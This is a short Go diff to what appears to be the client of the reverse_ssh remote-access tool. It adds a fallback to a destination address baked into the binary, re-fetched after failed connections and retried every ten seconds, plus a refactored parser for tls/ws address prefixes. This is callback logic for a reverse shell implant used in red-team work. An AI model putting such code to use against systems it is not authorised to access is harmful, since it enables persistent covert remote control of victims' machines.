@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"github.com/NHAS/reverse_ssh/static"
 	"io"
 	"log"
 	"net"
@@ -144,22 +145,31 @@ func Run(addr, fingerprint, proxyAddr string) {
 		ClientVersion: "SSH-" + internal.Version + "-" + runtime.GOOS + "_" + runtime.GOARCH,
 	}
 
-	// This sucks, but cant use url parse as it errors if you do something like '1.1.1.1:4343' and this is... somehow... more robust
-	useTLS := strings.HasPrefix(addr, "tls://") || strings.HasPrefix(addr, "wss://")
-	useWebsockets := strings.HasPrefix(addr, "ws://") || strings.HasPrefix(addr, "wss://")
+	var err error
 
-	addr = strings.TrimPrefix(strings.TrimPrefix(strings.TrimPrefix(addr, "tls://"), "wss://"), "ws://")
+	address := addr
+	if len(address) == 0 {
+		address, err = static.GetDestination()
+		if err != nil {
+			log.Fatalln("no addresses to connect to")
+		}
+	}
 
-	for { // My take on a golang do {} while loop :P
-		log.Println("Connecting to ", addr)
+	for {
+		useTLS, useWebsockets, addr := parseAddr(address)
+
+		log.Println("Connecting to", addr)
+
 		conn, err := Connect(addr, proxyAddr, config.Timeout)
 		if err != nil {
-
 			if errMsg := err.Error(); strings.Contains(errMsg, "missing port in address") {
 				log.Fatalf("Unable to connect to TCP invalid address: '%s', %s", addr, errMsg)
 			}
 
 			log.Printf("Unable to connect TCP: %s\n", err)
+
+			address, _ = static.GetDestination()
+
 			<-time.After(10 * time.Second)
 			continue
 		}
@@ -307,4 +317,14 @@ func Run(addr, fingerprint, proxyAddr string) {
 
 	}
 
+}
+
+// This sucks, but cant use url parse as it errors if you do something like '1.1.1.1:4343' and this is... somehow... more robust
+func parseAddr(addr string) (bool, bool, string) {
+	useTLS := strings.HasPrefix(addr, "tls://") || strings.HasPrefix(addr, "wss://")
+	useWebsockets := strings.HasPrefix(addr, "ws://") || strings.HasPrefix(addr, "wss://")
+
+	addr = strings.TrimPrefix(strings.TrimPrefix(strings.TrimPrefix(addr, "tls://"), "wss://"), "ws://")
+
+	return useTLS, useWebsockets, addr
 }
